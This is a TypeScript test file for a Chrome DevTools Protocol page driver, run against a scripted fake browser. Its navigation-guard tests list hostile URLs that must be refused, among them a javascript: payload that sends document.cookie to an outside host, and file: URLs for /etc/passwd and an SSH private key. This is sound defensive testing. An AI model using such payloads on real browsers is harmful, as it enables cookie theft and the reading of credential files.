import { readFileSync } from 'node:fs'
import { join } from 'node:path'
import { describe, expect, it } from 'vitest'
import { CdpPipe, type ReadableLike, type WritableLike } from './browser-cdp-pipe'
import { cdpDrivenPage, decodePngToRgba } from './browser-driven-cdp'
import { encodeRgbaPng } from './browser-png'

/**
 * The CDP page, driven over a scripted pipe.
 *
 * Nothing here spawns Chromium or opens a real debugger. A real
 * {@link CdpPipe} — the same framing the desktop's server will use — is fed a
 * fake fd pair, and a tiny scripted browser on the far end answers commands and
 * pushes events. That is enough to pin the properties that matter: a navigation
 * is guarded before a frame leaves, an isolated-world read never names the main
 * world, a screenshot decodes to a frame of the right shape, the page settles on
 * a load event, and a crash makes the page gone.
 */

/** A fake fd-4: pushes framed frames at the pipe. */
class FakeIn implements ReadableLike {
  private handlers = new Map<string, (arg: never) => void>()

  on(event: 'data' | 'end' | 'close' | 'error', listener: (arg: never) => void): this {
    this.handlers.set(event, listener)
    return this
  }

  push(value: Record<string, unknown>): void {
    const chunk = Buffer.from(JSON.stringify(value) + '\0', 'utf8')
    const data = this.handlers.get('data') as ((c: Buffer) => void) | undefined
    data?.(chunk)
  }

  end(): void {
    ;(this.handlers.get('end') as (() => void) | undefined)?.()
  }
}

interface SentCommand {
  id: number
  method: string
  params: Record<string, unknown>
  sessionId?: string
}

/**
 * A scripted browser on the far end of the pipe. It records every command,
 * answers each with a configured or default result, and can push events on a
 * session or at the browser level.
 */
class ScriptedBrowser {
  readonly pipe: CdpPipe
  readonly sent: SentCommand[] = []
  private readonly incoming = new FakeIn()
  private readonly replies = new Map<string, (params: Record<string, unknown>) => unknown>()
  readonly sessionId = 'session-1'
  readonly frameId = 'frame-1'
  readonly contextId = 42

  constructor() {
    const out: WritableLike = {
      write: (chunk: Buffer) => {
        this.onCommand(chunk)
        return true
      },
      once: () => out,
    }
    this.pipe = new CdpPipe(out, this.incoming)
  }

  /** Override the result for one method. Return an object, or throw to reject. */
  reply(method: string, fn: (params: Record<string, unknown>) => unknown): void {
    this.replies.set(method, fn)
  }

  emit(method: string, params: Record<string, unknown>): void {
    this.incoming.push({ sessionId: this.sessionId, method, params })
  }

  emitBrowser(method: string, params: Record<string, unknown>): void {
    this.incoming.push({ method, params })
  }

  end(): void {
    this.incoming.end()
  }

  commandsFor(method: string): SentCommand[] {
    return this.sent.filter((c) => c.method === method)
  }

  private onCommand(chunk: Buffer): void {
    const text = chunk.toString('utf8')
    const frame = JSON.parse(text.slice(0, -1)) as {
      id: number
      method: string
      params?: Record<string, unknown>
      sessionId?: string
    }
    const params = frame.params ?? {}
    this.sent.push({ id: frame.id, method: frame.method, params, sessionId: frame.sessionId })
    let result: unknown
    try {
      result = this.resultFor(frame.method, params)
    } catch (error) {
      this.incoming.push({
        id: frame.id,
        sessionId: frame.sessionId,
        error: { message: error instanceof Error ? error.message : String(error) },
      })
      return
    }
    this.incoming.push({ id: frame.id, sessionId: frame.sessionId, result: result ?? {} })
  }

  private resultFor(method: string, params: Record<string, unknown>): unknown {
    const override = this.replies.get(method)
    if (override) return override(params)
    switch (method) {
      case 'Target.attachToTarget':
        return { sessionId: this.sessionId }
      case 'Page.getFrameTree':
        return { frameTree: { frame: { id: this.frameId } } }
      case 'Page.createIsolatedWorld':
        return { executionContextId: this.contextId }
      case 'Runtime.evaluate':
        return { result: { value: null } }
      case 'Page.navigate':
        return { frameId: this.frameId, loaderId: 'loader-1' }
      default:
        return {}
    }
  }
}

function makePage(browser: ScriptedBrowser, url = 'https://start.example.com/') {
  return cdpDrivenPage(browser.pipe, { targetId: 'target-1', url })
}

describe('a navigation is guarded before a frame leaves', () => {
  it('sends Page.navigate for an http URL', async () => {
    const browser = new ScriptedBrowser()
    const page = makePage(browser)
    await page.attach()
    await page.loadURL('https://example.com/path')
    const navigates = browser.commandsFor('Page.navigate')
    expect(navigates).toHaveLength(1)
    expect(navigates[0].params.url).toBe('https://example.com/path')
    expect(navigates[0].sessionId).toBe(browser.sessionId)
  })

  it.each([
    'file:///etc/passwd',
    'javascript:fetch("https://x/"+document.cookie)',
    'data:text/html,<script>1</script>',
    'chrome://settings',
  ])('refuses %s and sends no navigate frame', async (url) => {
    const browser = new ScriptedBrowser()
    const page = makePage(browser)
    await page.attach()
    await expect(page.loadURL(url)).rejects.toThrow()
    expect(browser.commandsFor('Page.navigate')).toHaveLength(0)
  })

  it('guards navigateGuarded the same way, and reports navigated on success', async () => {
    const browser = new ScriptedBrowser()
    const page = makePage(browser)
    await page.attach()
    await expect(page.navigateGuarded('file:///Users/apple/.ssh/id_rsa')).rejects.toThrow()
    expect(browser.commandsFor('Page.navigate')).toHaveLength(0)
    await expect(page.navigateGuarded('https://example.com/')).resolves.toBe('navigated')
    expect(browser.commandsFor('Page.navigate')).toHaveLength(1)
  })
})

describe('an isolated-world read never names the main world', () => {
  it('creates a named world and evaluates only inside it', async () => {
    const browser = new ScriptedBrowser()
    browser.reply('Runtime.evaluate', () => ({ result: { value: [{ tag: 'a' }] } }))
    const page = makePage(browser)
    await page.attach()
    const value = await page.runInIsolatedWorld<Array<{ tag: string }>>('(function(){return document})()')
    expect(value).toEqual([{ tag: 'a' }])

    const worlds = browser.commandsFor('Page.createIsolatedWorld')
    expect(worlds).toHaveLength(1)
    expect(worlds[0].params.worldName).toBe('terminaldeck-drive')

    const evals = browser.commandsFor('Runtime.evaluate')
    expect(evals).toHaveLength(1)
    for (const call of evals) {
      // The whole point: a contextId, always, and it is the one the isolated
      // world was created as — never the main world (no context) and never an
      // objectId, which Chromium would ignore into the main world.
      expect(call.params.contextId).toBe(browser.contextId)
      expect(call.params.returnByValue).toBe(true)
      expect(call.params.awaitPromise).toBe(true)
      expect('objectId' in call.params).toBe(false)
    }
  })

  it('memoizes the world across reads, and rebuilds it after a navigation', async () => {
    const browser = new ScriptedBrowser()
    const page = makePage(browser)
    await page.attach()
    await page.runInIsolatedWorld('1')
    await page.runInIsolatedWorld('2')
    // One world for two reads.
    expect(browser.commandsFor('Page.createIsolatedWorld')).toHaveLength(1)

    // A new document is a new context; the next read builds a fresh world.
    browser.emit('Page.frameNavigated', { frame: { id: browser.frameId, url: 'https://next/' } })
    await page.runInIsolatedWorld('3')
    expect(browser.commandsFor('Page.createIsolatedWorld')).toHaveLength(2)
  })

  it('surfaces a thrown isolated-world script as an error', async () => {
    const browser = new ScriptedBrowser()
    browser.reply('Runtime.evaluate', () => ({
      exceptionDetails: { exception: { description: 'ReferenceError: nope is not defined' } },
    }))
    const page = makePage(browser)
    await page.attach()
    await expect(page.runInIsolatedWorld('nope()')).rejects.toThrow(/ReferenceError/)
  })

  it('drops a stale context and retries once', async () => {
    const browser = new ScriptedBrowser()
    let calls = 0
    browser.reply('Runtime.evaluate', () => {
      calls += 1
      if (calls === 1) throw new Error('Cannot find context with specified id')
      return { result: { value: 'ok' } }
    })
    const page = makePage(browser)
    await page.attach()
    await expect(page.runInIsolatedWorld('x')).resolves.toBe('ok')
    // Two worlds: the first was dropped when its context could not be found.
    expect(browser.commandsFor('Page.createIsolatedWorld')).toHaveLength(2)
  })
})

describe('a screenshot decodes to a raw RGBA frame', () => {
  it('captures a PNG and hands back a frame of the right shape', async () => {
    const width = 3
    const height = 2
    const data = Buffer.alloc(width * height * 4)
    for (let i = 0; i < data.length; i++) data[i] = (i * 7) & 0xff
    const png = encodeRgbaPng(data, width, height)

    const browser = new ScriptedBrowser()
    browser.reply('Page.captureScreenshot', () => ({ data: png.toString('base64') }))
    const page = makePage(browser)
    await page.attach()
    const frame = await page.capture()
    expect(frame.width).toBe(width)
    expect(frame.height).toBe(height)
    expect(frame.data.length).toBe(width * height * 4)
    expect(Buffer.compare(frame.data, data)).toBe(0)
  })

  it('throws rather than returning a mis-shaped buffer when there is no image', async () => {
    const browser = new ScriptedBrowser()
    browser.reply('Page.captureScreenshot', () => ({ data: '' }))
    const page = makePage(browser)
    await page.attach()
    await expect(page.capture()).rejects.toThrow()
  })
})

describe('decodePngToRgba reads the shapes a Chromium screenshot is', () => {
  it('round-trips an RGBA (colour type 6) frame', () => {
    const width = 4
    const height = 3
    const data = Buffer.alloc(width * height * 4)
    for (let i = 0; i < data.length; i++) data[i] = (255 - i) & 0xff
    const frame = decodePngToRgba(encodeRgbaPng(data, width, height))
    expect(frame.width).toBe(width)
    expect(frame.height).toBe(height)
    expect(Buffer.compare(frame.data, data)).toBe(0)
  })

  it('expands an RGB (colour type 2) frame to opaque RGBA through every filter', () => {
    // A hand-built RGB PNG, one row per filter type, so the unfilter arithmetic
    // for Sub, Up, Average and Paeth is exercised — not just the None path
    // encodeRgbaPng emits.
    const width = 3
    const height = 5
    const channels = 3
    const rgb = Buffer.alloc(width * height * channels)
    for (let i = 0; i < rgb.length; i++) rgb[i] = (i * 13 + 5) & 0xff
    const png = buildRgbPng(width, height, rgb, [0, 1, 2, 3, 4])
    const frame = decodePngToRgba(png)
    expect(frame.width).toBe(width)
    expect(frame.height).toBe(height)
    for (let p = 0; p < width * height; p++) {
      expect(frame.data[p * 4]).toBe(rgb[p * channels])
      expect(frame.data[p * 4 + 1]).toBe(rgb[p * channels + 1])
      expect(frame.data[p * 4 + 2]).toBe(rgb[p * channels + 2])
      expect(frame.data[p * 4 + 3]).toBe(0xff)
    }
  })
})

describe('the page settles on a load, and reports loading in between', () => {
  it('is loading after frameStartedLoading and settles on loadEventFired', async () => {
    const browser = new ScriptedBrowser()
    const page = makePage(browser)
    await page.attach()
    expect(page.isLoading()).toBe(false)

    browser.emit('Page.frameStartedLoading', { frameId: browser.frameId })
    expect(page.isLoading()).toBe(true)

    let settled = false
    const off = page.onSettled(() => {
      settled = true
    })
    browser.emit('Page.loadEventFired', { timestamp: 1 })
    expect(settled).toBe(true)
    expect(page.isLoading()).toBe(false)
    off()
  })

  it('tracks the current URL from a main-frame navigation', async () => {
    const browser = new ScriptedBrowser()
    const page = makePage(browser)
    await page.attach()
    browser.emit('Page.frameNavigated', { frame: { id: browser.frameId, url: 'https://moved.example/' } })
    expect(page.url()).toBe('https://moved.example/')
  })
})

describe('a page that goes is gone', () => {
  it('a session target-crash makes the page gone and fires onGone', async () => {
    const browser = new ScriptedBrowser()
    const page = makePage(browser)
    await page.attach()
    let goneFired = false
    page.onGone(() => {
      goneFired = true
    })
    expect(page.isGone()).toBe(false)
    browser.emit('Inspector.targetCrashed', {})
    expect(page.isGone()).toBe(true)
    expect(goneFired).toBe(true)
  })

  it('a browser-level target destroyed makes the page gone', async () => {
    const browser = new ScriptedBrowser()
    const page = makePage(browser)
    await page.attach()
    browser.emitBrowser('Target.targetDestroyed', { targetId: 'target-1' })
    expect(page.isGone()).toBe(true)
  })

  it('ignores another target being destroyed', async () => {
    const browser = new ScriptedBrowser()
    const page = makePage(browser)
    await page.attach()
    browser.emitBrowser('Target.targetDestroyed', { targetId: 'someone-else' })
    expect(page.isGone()).toBe(false)
  })

  it('the pipe closing takes the page with it', async () => {
    const browser = new ScriptedBrowser()
    const page = makePage(browser)
    await page.attach()
    browser.end()
    expect(page.isGone()).toBe(true)
  })

  it('fires onDestroyed by key, once', async () => {
    const browser = new ScriptedBrowser()
    const page = makePage(browser)
    await page.attach()
    let count = 0
    page.onDestroyed('browser-drive:own', () => {
      count += 1
    })
    browser.emit('Inspector.targetCrashed', {})
    expect(count).toBe(1)
  })

  it('a detach from the target fires onDetached but not onGone', async () => {
    const browser = new ScriptedBrowser()
    const page = makePage(browser)
    await page.attach()
    let detached = false
    let gone = false
    page.onDetached(() => {
      detached = true
    })
    page.onGone(() => {
      gone = true
    })
    browser.emitBrowser('Target.detachedFromTarget', { sessionId: browser.sessionId })
    expect(detached).toBe(true)
    expect(gone).toBe(false)
    expect(page.isAttached()).toBe(false)
  })
})

describe('attach and detach take and release the session', () => {
  it('attaches once, and detach releases the session', async () => {
    const browser = new ScriptedBrowser()
    const page = makePage(browser)
    expect(page.isAttached()).toBe(false)
    await page.attach()
    expect(page.isAttached()).toBe(true)
    await page.attach() // idempotent
    expect(browser.commandsFor('Target.attachToTarget')).toHaveLength(1)

    page.detach()
    expect(page.isAttached()).toBe(false)
    expect(browser.commandsFor('Target.detachFromTarget')).toHaveLength(1)
  })
})

describe('the block watcher rides the CDP events', () => {
  it('photographs a page the server refused', async () => {
    const browser = new ScriptedBrowser()
    const page = makePage(browser)
    await page.attach()

    const captured: string[] = []
    page.watchBlocks({
      state: () => 'agent',
      dir: () => join('/tmp', 'never-written'),
      text: async () => 'Access denied. Verify you are human.',
      shot: async () => null,
      now: () => 1_000_000,
      onCapture: (shot) => captured.push(shot.verdict.reason),
    })

    browser.emit('Network.responseReceived', {
      type: 'Document',
      response: { url: 'https://blocked.example/', status: 403, statusText: 'Forbidden' },
    })
    browser.emit('Page.frameNavigated', { frame: { id: browser.frameId, url: 'https://blocked.example/' } })
    browser.emit('Page.loadEventFired', {})
    await new Promise((resolve) => setTimeout(resolve, 0))

    expect(captured).toHaveLength(1)
    expect(captured[0]).toContain('403')
  })
})

/* ---------------------------------------------------------------- helpers -- */

/** A minimal PNG assembler, RGB (colour type 2), with a chosen filter per row. */
function buildRgbPng(width: number, height: number, pixels: Buffer, filters: number[]): Buffer {
  const channels = 3
  const stride = width * channels
  const raster = Buffer.alloc(height * (stride + 1))
  const prior = Buffer.alloc(stride)
  for (let y = 0; y < height; y++) {
    const filter = filters[y]
    raster[y * (stride + 1)] = filter
    for (let x = 0; x < stride; x++) {
      const raw = pixels[y * stride + x]
      const a = x >= channels ? pixels[y * stride + x - channels] : 0
      const b = prior[x]
      const c = x >= channels ? prior[x - channels] : 0
      let pred = 0
      if (filter === 1) pred = a
      else if (filter === 2) pred = b
      else if (filter === 3) pred = (a + b) >> 1
      else if (filter === 4) pred = paethPredictor(a, b, c)
      raster[y * (stride + 1) + 1 + x] = (raw - pred) & 0xff
    }
    pixels.copy(prior, 0, y * stride, y * stride + stride)
  }

  const zlib = require('node:zlib') as typeof import('node:zlib')
  const idat = zlib.deflateSync(raster)

  const ihdr = Buffer.alloc(13)
  ihdr.writeUInt32BE(width, 0)
  ihdr.writeUInt32BE(height, 4)
  ihdr[8] = 8
  ihdr[9] = 2 // colour type 2: truecolour, no alpha
  ihdr[10] = 0
  ihdr[11] = 0
  ihdr[12] = 0

  const signature = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a])
  // CRC is not checked by the decoder, so it is left zero here.
  const chunk = (type: string, payload: Buffer): Buffer => {
    const head = Buffer.alloc(8)
    head.writeUInt32BE(payload.length, 0)
    head.write(type, 4, 'ascii')
    return Buffer.concat([head, payload, Buffer.alloc(4)])
  }
  return Buffer.concat([
    signature,
    chunk('IHDR', ihdr),
    chunk('IDAT', idat),
    chunk('IEND', Buffer.alloc(0)),
  ])
}

function paethPredictor(a: number, b: number, c: number): number {
  const p = a + b - c
  const pa = Math.abs(p - a)
  const pb = Math.abs(p - b)
  const pc = Math.abs(p - c)
  if (pa <= pb && pa <= pc) return a
  if (pb <= pc) return b
  return c
}

describe('the module stays out of Electron', () => {
  it('imports nothing from electron', () => {
    const source = readFileSync(join(__dirname, 'browser-driven-cdp.ts'), 'utf8')
    expect(/from ['"]electron['"]/.test(source)).toBe(false)
    expect(/require\(['"]electron['"]\)/.test(source)).toBe(false)
  })
})
